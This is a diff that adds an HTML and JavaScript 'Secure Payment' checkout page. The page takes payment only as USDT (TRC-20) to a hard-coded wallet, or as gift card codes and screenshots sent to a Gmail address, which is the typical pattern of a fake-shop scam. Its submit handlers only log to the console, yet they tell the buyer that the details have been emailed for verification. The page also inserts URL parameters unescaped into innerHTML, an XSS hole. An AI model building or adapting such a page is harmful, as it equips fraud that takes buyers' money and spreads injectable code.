@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Checkout</title>
+    <!-- Load Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* Custom Tailwind Configuration for a modern, minimalist luxury aesthetic */
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'primary-dark': '#1F2937',      /* Charcoal */
+                        'accent-blush': '#EC4899',      /* Soft Pink/Blush */
+                        'soft-bg': '#F9FAFB',           /* Very light gray background */
+                    },
+                }
+            }
+        }
+
+        /* Base styles */
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f3f4f6;
+        }
+        
+        /* Custom styling for file input to look nicer (simulated) */
+        .file-input-label {
+            display: block;
+            cursor: pointer;
+            padding: 0.5rem 1rem;
+            border: 2px dashed #EC489950;
+            border-radius: 0.5rem;
+            text-align: center;
+            transition: all 0.2s;
+        }
+        .file-input-label:hover {
+            background-color: #EC489910;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex items-center justify-center p-4">
+
+    <!-- Main Checkout Container -->
+    <div class="w-full max-w-xl bg-white shadow-2xl rounded-2xl p-6 md:p-8 space-y-6">
+        
+        <header class="text-center space-y-2 pb-4 border-b border-gray-100">
+            <h1 class="text-3xl font-bold text-primary-dark">Secure Payment</h1>
+            <p class="text-md text-gray-500">Manual Verification Required</p>
+            
+            <!-- Product Summary (Populated by JS) -->
+            <div class="text-lg pt-2 text-accent-blush font-semibold">
+                <span id="product-summary">Loading Product Details...</span>
+            </div>
+        </header>
+
+        <!-- Payment Method Tabs -->
+        <div class="flex border-b border-gray-200">
+            <button id="tab-crypto" onclick="switchTab('crypto')" 
+                class="flex-1 py-3 text-center text-sm font-semibold transition duration-200 border-b-2 border-accent-blush text-accent-blush">
+                Cryptocurrency (USDT)
+            </button>
+            <button id="tab-giftcard" onclick="switchTab('giftcard')" 
+                class="flex-1 py-3 text-center text-sm font-semibold transition duration-200 border-b-2 border-transparent text-gray-500 hover:text-primary-dark">
+                Gift Card
+            </button>
+        </div>
+
+        <!-- 1. Crypto Payment Section -->
+        <div id="content-crypto" class="space-y-6 pt-4">
+            
+            <div class="p-4 bg-soft-bg rounded-xl space-y-3">
+                <p class="font-bold text-lg text-primary-dark">1. Transfer Details</p>
+                <div class="text-sm">
+                    <p class="text-gray-600">Currency: <span class="font-mono font-bold text-primary-dark">USDT</span></p>
+                    <p class="text-gray-600">Network: <span class="font-mono font-bold text-primary-dark">Tron (TRC-20)</span></p>
+                </div>
+                
+                <!-- Wallet Address -->
+                <div class="bg-white p-3 rounded-lg border border-accent-blush/50 flex justify-between items-center space-x-2">
+                    <code id="crypto-address" class="text-xs md:text-sm font-mono text-primary-dark break-all">TLy1BiiY7AiuUzVkM6u2hEMo2HZeF28RTp</code>
+                    <button onclick="copyToClipboard('crypto-address')" 
+                            class="flex-shrink-0 p-2 text-xs font-semibold rounded-md bg-accent-blush text-white hover:bg-pink-600 transition">
+                        Copy
+                    </button>
+                </div>
+            </div>
+
+            <form id="crypto-form" class="space-y-4">
+                
+                <!-- Proof of Payment Screenshot -->
+                <div>
+                    <label for="crypto-screenshot" class="block text-sm font-medium text-primary-dark mb-1">
+                        2. Screenshot of Transaction (Required for Verification)
+                    </label>
+                    <label for="crypto-screenshot" id="crypto-label" class="file-input-label text-gray-500">
+                        Click to select screenshot (JPEG/PNG)
+                    </label>
+                    <input type="file" id="crypto-screenshot" name="crypto-screenshot" accept="image/png, image/jpeg" class="hidden" required onchange="updateFileName('crypto-screenshot', 'crypto-label')">
+                </div>
+
+                <!-- Submit Button -->
+                <button type="button" onclick="submitCryptoPayment()" 
+                        class="w-full py-3 mt-4 text-white font-bold rounded-xl 
+                                bg-primary-dark hover:bg-gray-700 transition duration-300 shadow-lg 
+                                active:bg-gray-800">
+                    I Have Sent Crypto - Confirm Payment
+                </button>
+            </form>
+        </div>
+
+        <!-- 2. Gift Card Payment Section -->
+        <div id="content-giftcard" class="space-y-6 pt-4 hidden">
+            
+            <div class="p-4 bg-soft-bg rounded-xl space-y-3">
+                <p class="font-bold text-lg text-primary-dark">1. Recipient Email</p>
+                <p class="bg-white p-3 rounded-lg border border-accent-blush/50 text-sm text-gray-600">
+                    <!-- UPDATED EMAIL ADDRESS -->
+                    <span class="font-mono font-bold text-primary-dark">imarket247weekly@gmail.com</span>
+                </p>
+                <p class="text-sm text-gray-500">Please ensure your gift card is redeemable at this email address.</p>
+            </div>
+
+            <form id="giftcard-form" class="space-y-4">
+                
+                <!-- Gift Card Code Input -->
+                <div>
+                    <label for="giftcard-code" class="block text-sm font-medium text-primary-dark mb-1">
+                        2. Gift Card Code / Verification Number
+                    </label>
+                    <input type="text" id="giftcard-code" name="giftcard-code" placeholder="Enter the 16-digit code or reference number" 
+                           class="w-full p-3 border border-gray-300 rounded-lg focus:ring-accent-blush focus:border-accent-blush transition" required>
+                </div>
+
+                <!-- Screenshot of Gift Card/Receipt -->
+                <div>
+                    <label for="giftcard-screenshot" class="block text-sm font-medium text-primary-dark mb-1">
+                        3. Screenshot of Card/Receipt (Required for Verification)
+                    </label>
+                    <label for="giftcard-screenshot" id="giftcard-label" class="file-input-label text-gray-500">
+                        Click to select screenshot (JPEG/PNG)
+                    </label>
+                    <input type="file" id="giftcard-screenshot" name="giftcard-screenshot" accept="image/png, image/jpeg" class="hidden" required onchange="updateFileName('giftcard-screenshot', 'giftcard-label')">
+                </div>
+
+                <!-- Submit Button -->
+                <button type="button" onclick="submitGiftCardPayment()"
+                        class="w-full py-3 mt-4 text-white font-bold rounded-xl 
+                                bg-accent-blush hover:bg-pink-600 transition duration-300 shadow-lg 
+                                active:bg-pink-700">
+                    Submit Gift Card Details
+                </button>
+            </form>
+        </div>
+        
+        <!-- Confirmation/Message Box -->
+        <div id="custom-message-box"></div>
+
+    </div>
+
+    <script>
+        const productSummaryElement = document.getElementById('product-summary');
+        const defaultPrice = 'XX.XX'; // Placeholder price since price wasn't passed from index.html
+
+        // --- UPDATED VERIFICATION EMAIL ADDRESS ---
+        const VERIFICATION_EMAIL = 'imarket247weekly@gmail.com';
+
+
+        /**
+         * 1. INITIALIZATION: Get product details from URL and update summary.
+         */
+        function initializePage() {
+            const params = new URLSearchParams(window.location.search);
+            const productId = params.get('id') || 'N/A';
+            const productName = params.get('name') || 'Selected Item';
+            
+            // Update UI elements
+            productSummaryElement.innerHTML = `
+                <span class="font-bold">${productName}</span> 
+                (ID: <span class="text-primary-dark">${productId}</span>)
+                - Amount: $${defaultPrice}
+            `;
+            
+            // Set initial active tab
+            switchTab('crypto');
+        }
+
+        /**
+         * 2. TAB SWITCHING LOGIC
+         */
+        function switchTab(activeTab) {
+            document.getElementById('tab-crypto').classList.remove('border-accent-blush', 'text-accent-blush');
+            document.getElementById('tab-giftcard').classList.remove('border-accent-blush', 'text-accent-blush');
+            
+            document.getElementById('tab-crypto').classList.add('border-transparent', 'text-gray-500');
+            document.getElementById('tab-giftcard').classList.add('border-transparent', 'text-gray-500');
+
+            if (activeTab === 'crypto') {
+                document.getElementById('tab-crypto').classList.add('border-accent-blush', 'text-accent-blush');
+                document.getElementById('content-crypto').classList.remove('hidden');
+                document.getElementById('content-giftcard').classList.add('hidden');
+            } else {
+                document.getElementById('tab-giftcard').classList.add('border-accent-blush', 'text-accent-blush');
+                document.getElementById('content-giftcard').classList.remove('hidden');
+                document.getElementById('content-crypto').classList.add('hidden');
+            }
+        }
+
+        /**
+         * 3. UTILITY FUNCTIONS
+         */
+        
+        /** Copies the crypto address to the clipboard. */
+        function copyToClipboard(elementId) {
+            const copyText = document.getElementById(elementId).textContent;
+            
+            // Use document.execCommand('copy') for better compatibility in iframe environments
+            try {
+                const tempInput = document.createElement('textarea');
+                tempInput.value = copyText;
+                document.body.appendChild(tempInput);
+                tempInput.select();
+                document.execCommand('copy');
+                document.body.removeChild(tempInput);
+                showMessageBox('Crypto address copied to clipboard!', 'success');
+            } catch (err) {
+                showMessageBox('Failed to copy address.', 'error');
+            }
+        }
+
+        /** Updates the file input label with the selected file name. */
+        function updateFileName(inputId, labelId) {
+            const input = document.getElementById(inputId);
+            const label = document.getElementById(labelId);
+            if (input.files.length > 0) {
+                label.textContent = `File selected: ${input.files[0].name}`;
+                label.classList.add('text-primary-dark', 'font-semibold');
+                label.classList.remove('text-gray-500');
+            } else {
+                label.textContent = 'Click to select screenshot (JPEG/PNG)';
+                label.classList.remove('text-primary-dark', 'font-semibold');
+                label.classList.add('text-gray-500');
+            }
+        }
+        
+        /** Creates and shows a custom, temporary message box. */
+        function showMessageBox(message, type = 'info') {
+            let msgBox = document.getElementById('custom-message-box');
+            if (!msgBox) {
+                msgBox = document.createElement('div');
+                msgBox.id = 'custom-message-box';
+                document.body.appendChild(msgBox); 
+            }
+
+            let bgColor = 'bg-gray-700';
+            if (type === 'success') {
+                bgColor = 'bg-green-600';
+            } else if (type === 'error') {
+                bgColor = 'bg-red-600';
+            } else if (type === 'confirmation') {
+                bgColor = 'bg-accent-blush';
+            }
+
+            // Apply styles dynamically for floating notification
+            msgBox.className = 'fixed bottom-4 right-4 text-white p-4 rounded-lg shadow-xl text-sm font-semibold z-50 transition-opacity duration-500 max-w-xs';
+            msgBox.classList.add(bgColor);
+            msgBox.classList.remove('opacity-0', 'hidden');
+            msgBox.classList.add('opacity-100');
+            msgBox.textContent = message;
+
+            clearTimeout(msgBox.timer);
+            msgBox.timer = setTimeout(() => {
+                msgBox.classList.remove('opacity-100');
+                msgBox.classList.add('opacity-0');
+                setTimeout(() => msgBox.classList.add('hidden'), 500); 
+            }, 5000); 
+        }
+
+        /**
+         * 4. FORM SUBMISSION HANDLERS
+         */
+        
+        /** Handles Crypto Payment Submission (Triggered by "I Have Sent" button) */
+        function submitCryptoPayment() {
+            const form = document.getElementById('crypto-form');
+            const screenshotInput = document.getElementById('crypto-screenshot');
+            
+            if (!form.reportValidity()) {
+                showMessageBox('Please provide the transaction screenshot.', 'error');
+                return;
+            }
+
+            const productId = new URLSearchParams(window.location.search).get('id') || 'N/A';
+            const productName = new URLSearchParams(window.location.search).get('name') || 'Selected Item';
+
+            // --- SIMULATED EMAIL NOTIFICATION ---
+            const confirmationMessage = `
+                Payment Sent Confirmation:
+                - Product: ${productName} (ID: ${productId})
+                - Payment Method: USDT (TRC-20)
+                - Verification Status: Screenshot provided for manual check.
+            `;
+
+            console.log("--- SIMULATED ACTION: Sending Confirmation Email ---");
+            console.log(`To: ${VERIFICATION_EMAIL}`);
+            console.log(confirmationMessage);
+            console.log("-----------------------------------------------------");
+
+
+            showMessageBox(
+                `A confirmation message has been sent to ${VERIFICATION_EMAIL}. Your payment is now pending manual verification via the screenshot provided.`, 
+                'confirmation'
+            );
+            
+            // Optionally, disable the button to prevent double-submission
+            document.querySelector('#content-crypto button').disabled = true;
+        }
+
+        /** Handles Gift Card Submission */
+        function submitGiftCardPayment() {
+            const form = document.getElementById('giftcard-form');
+            const codeInput = document.getElementById('giftcard-code');
+            const screenshotInput = document.getElementById('giftcard-screenshot');
+
+            if (!form.reportValidity()) {
+                showMessageBox('Please fill in the card code and provide the screenshot.', 'error');
+                return;
+            }
+
+            const productId = new URLSearchParams(window.location.search).get('id') || 'N/A';
+            const productName = new URLSearchParams(window.location.search).get('name') || 'Selected Item';
+            const giftCardCode = codeInput.value.trim();
+
+            // --- SIMULATED EMAIL NOTIFICATION ---
+            const confirmationMessage = `
+                Gift Card Submission:
+                - Product: ${productName} (ID: ${productId})
+                - Code Provided: ${giftCardCode}
+                - Verification Status: Screenshot provided for manual check.
+            `;
+
+            console.log("--- SIMULATED ACTION: Sending Gift Card Details Email ---");
+            console.log(`To: ${VERIFICATION_EMAIL}`);
+            console.log(confirmationMessage);
+            console.log("----------------------------------------------------------");
+
+            showMessageBox(
+                `Gift Card details submitted. They have been forwarded to ${VERIFICATION_EMAIL} for immediate manual verification.`, 
+                'confirmation'
+            );
+
+            // Optionally, disable the button to prevent double-submission
+            document.querySelector('#content-giftcard button').disabled = true;
+        }
+
+        // Initialize the page when the content loads
+        document.addEventListener('DOMContentLoaded', initializePage);
+    </script>
+
+</body>
+</html>
+
